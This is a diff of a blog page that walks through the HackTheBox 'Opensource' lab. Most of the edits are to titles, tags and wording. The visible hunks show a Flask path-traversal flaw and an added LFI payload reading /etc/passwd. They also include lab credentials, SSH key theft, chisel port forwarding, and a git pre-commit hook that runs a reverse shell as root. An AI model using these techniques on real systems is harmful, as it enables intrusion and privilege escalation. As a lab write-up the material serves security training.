@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="MØstXeon">
 <meta name="description" content="false" />
-<meta name="keywords" content=", Source-Code-Review, git, Path-Traversal, Port-Forwarding, git-hooks, python" />
+<meta name="keywords" content=", HackTheBox, Linux, Source-Code-Review, Python, Flask, Git, Clear-Text-Credentials, Path-Traversal, Burp-Suite, Port-Forwarding, Chisel, Gitea, Process-Snooping, Pspy, git-hooks, Git-Pre-Commit" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
 <link rel="canonical" href="https://mostxeon.github.io/posts/opensource/" />
@@ -14,7 +14,7 @@
 
     <title>
         
-            Opensource :: MØst Xeon  — A simple blog about Cyber Security
+            Opensource Write-Up :: MØst Xeon  — Simple Cyber Security Blog
         
     </title>
 
@@ -38,14 +38,14 @@
     <meta name="msapplication-TileColor" content="">
 
 
-<meta itemprop="name" content="Opensource">
+<meta itemprop="name" content="Opensource Write-Up">
 <meta itemprop="description" content="false"><meta itemprop="datePublished" content="2022-09-28T08:35:17+03:00" />
 <meta itemprop="dateModified" content="2022-09-28T08:35:17+03:00" />
-<meta itemprop="wordCount" content="3010"><meta itemprop="image" content="https://mostxeon.github.io/posts/opensource/discovering-home-dir-backup.png">
-<meta itemprop="keywords" content="Source-Code-Review,git,Path-Traversal,Port-Forwarding,git-hooks,python," />
+<meta itemprop="wordCount" content="3005"><meta itemprop="image" content="https://mostxeon.github.io/posts/opensource/discovering-home-dir-backup.png">
+<meta itemprop="keywords" content="HackTheBox,Linux,Source-Code-Review,Python,Flask,Git,Clear-Text-Credentials,Path-Traversal,Burp-Suite,Port-Forwarding,Chisel,Gitea,Process-Snooping,Pspy,git-hooks,Git-Pre-Commit," />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://mostxeon.github.io/posts/opensource/discovering-home-dir-backup.png"/>
-<meta name="twitter:title" content="Opensource"/>
+<meta name="twitter:title" content="Opensource Write-Up"/>
 <meta name="twitter:description" content="false"/>
 
 
@@ -63,6 +63,18 @@
 
 
 
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PQV7ZN74BD"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-PQV7ZN74BD', { 'anonymize_ip': false });
+}
+</script>
 
 
     </head>
@@ -139,14 +151,14 @@
 
     <article>
       <h1 class="post-title">
-        <a href="https://mostxeon.github.io/posts/opensource/">Opensource</a>
+        <a href="https://mostxeon.github.io/posts/opensource/">Opensource Write-Up</a>
       </h1>
 
       
 
       
         <figure class="post-cover">
-          <img src="https://www.hackthebox.com/storage/avatars/789e24a78e57e307944d8dbbde67cc32.png" alt="Opensource" />
+          <img src="https://www.hackthebox.com/storage/avatars/789e24a78e57e307944d8dbbde67cc32.png" alt="Opensource Write-Up" />
           
           
             <figcaption class="center">Machine created by <a href="https://app.hackthebox.com/users/476556">irogir</a></figcaption>
@@ -191,7 +203,7 @@
       <div class="post-content">
         <h2 id="initial-recon">Initial Recon</h2>
 <h3 id="nmap">Nmap</h3>
-<p>Starting with a full tcp port scan we got the below results:</p>
+<p>Starting with a full tcp port scan I got the below results:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -sV -sC -vvv -p- -oN nmap/nmap-all-tcp.txt
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.164
@@ -303,7 +315,7 @@
 <p>By surfing the home page on port 80, I can see two buttons, one to download the source code for a certain application and the other one to go to a page where you can upload a file.</p>
 <p><img src="exploring-home-page.png" alt="Exploring the Home Page"></p>
 <h3 id="exploring-the-source-code">Exploring the Source Code</h3>
-<p>Let&rsquo;s download the source code and inspect it</p>
+<p>Let&rsquo;s download the source code and inspect it:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ls
 </span></span><span style="display:flex;"><span>source.zip
 </span></span><span style="display:flex;"><span>
@@ -501,38 +513,39 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recursive_replace(search<span style="color:#f92672">.</span>replace(replace_me, with_me), replace_me, with_me)
 </span></span></code></pre></div><p>It appears that there are 2 functions, <em>get_file_name</em> (unsafe) and <em>get_unique_upload_name</em> (considered by the developer safe) but is not yet implemented. This code here uses the unsafe <em>get_file_name</em> that calls <em>recursive_replace</em> function which replaces <em>../</em> string with nothing, and since it is recusivly doing that, there is no way to get arround it.</p>
 <p>However in the <em>app/app/views.py</em> this function is called, then its output is passed to the <em>os.path.join</em> function, then to the <em>send_file</em> function from <a href="https://github.com/pallets/flask"><em>Flask</em></a> which will return the content of the file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat app/app/views.py 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> cat app<span style="color:#f92672">/</span>app<span style="color:#f92672">/</span>views<span style="color:#f92672">.</span>py 
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>import os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>from app.utils import get_file_name
-</span></span><span style="display:flex;"><span>from flask import render_template, request, send_file
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app.utils <span style="color:#f92672">import</span> get_file_name
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> render_template, request, send_file
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>from app import app
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>@app.route<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=[</span><span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span><span style="color:#f92672">])</span>
-</span></span><span style="display:flex;"><span>def upload_file<span style="color:#f92672">()</span>:
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request.method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
-</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> request.files<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;file&#39;</span><span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>        file_name <span style="color:#f92672">=</span> get_file_name<span style="color:#f92672">(</span>f.filename<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> os.path.join<span style="color:#f92672">(</span>os.getcwd<span style="color:#f92672">()</span>, <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, file_name<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>        f.save<span style="color:#f92672">(</span>file_path<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;success.html&#39;</span>, file_url<span style="color:#f92672">=</span>request.host_url + <span style="color:#e6db74">&#34;uploads/&#34;</span> + file_name<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;upload.html&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app <span style="color:#f92672">import</span> app
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>@app.route<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/uploads/&lt;path:path&gt;&#39;</span><span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>def send_report<span style="color:#f92672">(</span>path<span style="color:#f92672">)</span>:
-</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> get_file_name<span style="color:#f92672">(</span>path<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file<span style="color:#f92672">(</span>os.path.join<span style="color:#f92672">(</span>os.getcwd<span style="color:#f92672">()</span>, <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, path<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_file</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
+</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;file&#39;</span>]
+</span></span><span style="display:flex;"><span>        file_name <span style="color:#f92672">=</span> get_file_name(f<span style="color:#f92672">.</span>filename)
+</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, file_name)
+</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>save(file_path)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;success.html&#39;</span>, file_url<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>host_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;uploads/&#34;</span> <span style="color:#f92672">+</span> file_name)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;upload.html&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/uploads/&lt;path:path&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_report</span>(path):
+</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> get_file_name(path)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, path))
 </span></span></code></pre></div><p>From the first look this code appears to be secure, however the use of <em>os.path.join</em> ruined everything, because if this function takes parameters like <em>(&quot;/var/www/html&quot;, &ldquo;app&rdquo;, &ldquo;/etc/passwd&rdquo;)</em> and tries to return the path of that, instead of returning something like <em>&quot;/var/www/html/app/etc/passwd&quot;</em>, it will return <em>&quot;/etc/passwd&quot;</em> due to the <em>/</em> at the begining of the last string.</p>
 <h3 id="exploiting-the-vulnerability">Exploiting the Vulnerability</h3>
 <p>Now let&rsquo;s try to see if this vulnerability exists in the production code.</p>
 <p>For this I will try to upload a file first and then access it to make sure that everything is normal and the application is taking my file and storing it somewhere.</p>
 <p><img src="trying-to-upload-normal-file.png" alt="Uploading Normal file"></p>
 <p>Looks like this application is not using a function like <em>get_unique_upload_name</em> because the name of the uploaded file is the same.</p>
-<p>Now I will try the <em>Local File Inclusion</em> payload using <a href="https://portswigger.net/burp"><em>Burp Suite</em></a>.</p>
+<p>Now I will try the <em>Local File Inclusion</em> payload using <a href="https://portswigger.net/burp"><em>Burp Suite</em></a>:</p>
+<p><code>uploads//etc/passwd</code></p>
 <p><img src="Initial-LFI-try.png" alt="LFI Initial Try"></p>
 <p>Looks like I got redirected. After playing a little bit with <a href="https://github.com/pallets/flask"><em>Flask</em></a> localy, I noticed that this is a nomral behavior in it, if the url path contained something like <em>uploads//something/here</em> it will redirect it to <em>uploads/something/here</em> then will process this new request.</p>
 <p>To avoid this, I can make use fo the <em>get_file_name</em> being called to check for <em>../</em> string and remove it:</p>
@@ -623,7 +636,7 @@
 </span></span><span style="display:flex;"><span>        valid_lft forever preferred_lft forever
 </span></span></code></pre></div><ul>
 <li>
-<p>You might get some weird characters at the begining of the prompt like <em>/app # ^[[24;8R</em> which is ok, you can avoid this by getting a fully interactive shell, via backgrounding the shell using <em>CTRL+z</em> then issuing the command <em>stty raw -echo;fg</em> and pressing enter.</p>
+<p>You might get some weird characters at the begining of the prompt like <em>/app # ^[[24;8R</em> which is ok, you can avoid this by getting a fully interactive shell, via backgrounding the shell using <em>CTRL+z</em> then issuing the command <code>stty raw -echo;fg</code> and pressing enter.</p>
 </li>
 <li>
 <p>This is a simple python3 script I wrote to upload the file automatically and get a reverse shell, I just need to listen on my specified port before executing it.</p>
@@ -665,7 +678,7 @@
 </span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
 </span></span><span style="display:flex;"><span>Set-Cookie: i_like_gitea<span style="color:#f92672">=</span>a0f2435183e3d93a; Path<span style="color:#f92672">=</span>/; HttpOnly; SameSite<span style="color:#f92672">=</span>Lax
 </span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#ae81ff">05</span> Oct <span style="color:#ae81ff">2022</span> 15:11:22 GMT
-</span></span></code></pre></div><p>And I got a response, and by reading the session cookie I can tell that this application is <a href="https://gitea.io/en-us/"><em>Gitea</em></a>.</p>
+</span></span></code></pre></div><p>I got a response, and by reading the session cookie I can tell that this application is <a href="https://gitea.io/en-us/"><em>Gitea</em></a>.</p>
 <h3 id="getting-user-on-the-host-machine">Getting User On the Host Machine</h3>
 <p>I&rsquo;ll upload <a href="https://github.com/jpillora/chisel/releases"><em>chisel</em></a> to the victim machine and <em>port forward</em> the port <em>3000</em> to my local attacking machine.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server
@@ -694,7 +707,7 @@
 <p><img src="accessing-gitea.png" alt="Accessing Gitea From My Machine"></p>
 <p>Now I&rsquo;ll use the previous credentials <em>dev01:Soulless_Developer#2022</em> to try to login to this instance.</p>
 <p><img src="discovering-home-dir-backup.png" alt="Loging In To Gitea"></p>
-<p>It appears that this user is trying to backup his home directory, so we can take advantage of this and read his <em>.ssh/id_rsa</em> key file.</p>
+<p>It appears that this user is trying to backup his home directory, so I can take advantage of this and read his <em>.ssh/id_rsa</em> key file.</p>
 <p><img src="reading-ssh-key.png" alt="Reading SSH Key"></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ chmod <span style="color:#ae81ff">600</span> dev01_id_rsa 
 </span></span><span style="display:flex;"><span>$ cat dev01_id_rsa 
@@ -817,9 +830,9 @@
 </span></span><span style="display:flex;"><span>    git push origin main
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
 </span></span></code></pre></div><h3 id="getting-root">Getting root</h3>
-<p>The overall idea about escalating privileges is about root <em>commiting changes</em> by navigating to the <em>/home/dev01</em> directory and then commiting these changes. So I can <em>add a hook</em> in the <em>.git/hooks/</em> directory which is a script that will get executed by any user running a specific git command.</p>
-<p>There are many types of hooks, for example a <em>pre-commit</em> hook will run before the user commits a change, on the other hand, a <em>post-commit</em> hook will run after the commit takes place, and there are others depending on the actions taken like push &hellip;</p>
-<p>So, I&rsquo;ll add a new file in <em>.git/hooks/</em> called <em>pre-commit</em> that contains a reverse shell and make it executable and this will run whenever any user makes a commit in this repo/directory, and since root is making commits when any change is made to the directory, I&rsquo;ll also create a new file.</p>
+<p>The overall idea to escalate privileges is about root <em>commiting changes</em> after navigating to the <em>/home/dev01</em> directory. So I can <em>add a hook</em> in the <em>.git/hooks/</em> directory which is a script that will get executed by any user running a specific git command.</p>
+<p>There are many types of hooks, for example a <em>pre-commit</em> hook will run before the user commits a change. On the other hand, a <em>post-commit</em> hook will run after the commit takes place, and there are others depending on the actions taken like push etc&hellip;</p>
+<p>So, I&rsquo;ll add a new file in <em>.git/hooks/</em> called <em>pre-commit</em> that contains a reverse shell and make it executable and this will run whenever any user makes a commit in this repo/directory. And since root is making commits when any change is made to the directory, I&rsquo;ll also create a new file.</p>
 <p>To get root:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>touch ~/dummyfile
 </span></span><span style="display:flex;"><span>touch ~/.git/hooks/pre-commit;
@@ -844,12 +857,22 @@
     <p>
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
 
+        <span class="tag"><a href="https://mostxeon.github.io/tags/hackthebox/">HackTheBox</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/linux/">Linux</a></span>
         <span class="tag"><a href="https://mostxeon.github.io/tags/source-code-review/">Source-Code-Review</a></span>
-        <span class="tag"><a href="https://mostxeon.github.io/tags/git/">git</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/python/">Python</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/flask/">Flask</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/git/">Git</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/clear-text-credentials/">Clear-Text-Credentials</a></span>
         <span class="tag"><a href="https://mostxeon.github.io/tags/path-traversal/">Path-Traversal</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/burp-suite/">Burp-Suite</a></span>
         <span class="tag"><a href="https://mostxeon.github.io/tags/port-forwarding/">Port-Forwarding</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/chisel/">Chisel</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/gitea/">Gitea</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/process-snooping/">Process-Snooping</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/pspy/">Pspy</a></span>
         <span class="tag"><a href="https://mostxeon.github.io/tags/git-hooks/">git-hooks</a></span>
-        <span class="tag"><a href="https://mostxeon.github.io/tags/python/">python</a></span>
+        <span class="tag"><a href="https://mostxeon.github.io/tags/git-pre-commit/">Git-Pre-Commit</a></span>
         
     </p>
 
@@ -874,7 +897,7 @@
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        3010 Words
+        3005 Words
       </p>
 
       <p>
@@ -913,7 +936,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Opensource&amp;caption=Opensource&amp;canonicalUrl=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Opensource%20Write-Up&amp;caption=Opensource%20Write-Up&amp;canonicalUrl=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
   <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
     <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
@@ -922,7 +945,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="mailto:?subject=Opensource&amp;body=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+<a class="resp-sharing-button__link" href="mailto:?subject=Opensource%20Write-Up&amp;body=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
   <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
     </div>
@@ -930,7 +953,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f&amp;media=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f;description=Opensource" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f&amp;media=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f;description=Opensource%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
   <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
     </div>
@@ -938,7 +961,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f&amp;title=Opensource&amp;summary=Opensource&amp;source=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f&amp;title=Opensource%20Write-Up&amp;summary=Opensource%20Write-Up&amp;source=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
   <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
     </div>
@@ -946,7 +969,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f&amp;resubmit=true&amp;title=Opensource" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f&amp;resubmit=true&amp;title=Opensource%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
   <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
     </div>
@@ -954,7 +977,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f;title=Opensource" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f;title=Opensource%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on xing">
   <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
     </div>
@@ -962,7 +985,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="whatsapp://send?text=Opensource%20https%3a%2f%2fmostxeon.github.io%2fposts%2fopensource%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
